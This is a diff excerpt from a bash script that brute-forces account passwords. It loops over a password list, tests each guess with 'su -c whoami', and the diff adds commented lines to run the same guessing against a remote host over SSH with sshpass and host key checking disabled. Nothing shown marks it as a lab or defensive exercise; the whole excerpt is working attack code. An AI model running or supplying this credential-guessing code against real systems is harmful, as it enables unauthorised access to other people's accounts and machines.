@@ -260,6 +260,10 @@ for pass in "${passwords[@]}"; do
     # Test the credential pair by running "whoami" as the given user. Suppress error responses.
     output=$(echo -e "$pass\n" | su -c "whoami" $user 2>/dev/null)
 	
+	# Uncomment this if you want to log into a remote server rather than this one.
+	# host=""
+	# output=$(echo -e "$pass\n" | sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" 'whoami' 2>/dev/null)
+	
     # Check if the output matches the expected username.
     if [[ $output == $user ]]; then
 	
